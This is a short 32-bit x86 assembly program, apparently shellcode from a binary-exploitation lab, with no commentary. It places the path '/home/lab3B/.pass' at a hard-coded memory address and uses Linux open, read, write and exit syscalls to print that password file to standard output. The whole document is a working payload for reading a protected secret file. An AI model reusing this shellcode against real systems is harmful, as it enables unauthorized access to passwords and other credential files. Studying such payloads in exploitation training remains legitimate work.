BITS 32


section .text

global _start
_start:


xor ebx,ebx
push 0x08049c0c
pop ebx

mov dword[0X08049c0c],'/hom'
mov dword[0x08049c0c+4],'e/la'
mov dword[0x08049c0c+8],'b3B/'
mov dword[0x08049c0c+12],'.pas'
mov byte[0x08049c0c+16], 's'


push 5
pop eax
xor ecx,ecx
int 0x80

push eax
pop ebx
push byte 0x3
pop eax

mov ecx,esp
add ecx,0x32
push byte 0x7f
pop edx
int 0x80

xor ebx,ebx
inc ebx
push byte 4
pop eax
int 0x80

xor ebx,ebx
xor eax,eax
inc eax
int 0x80
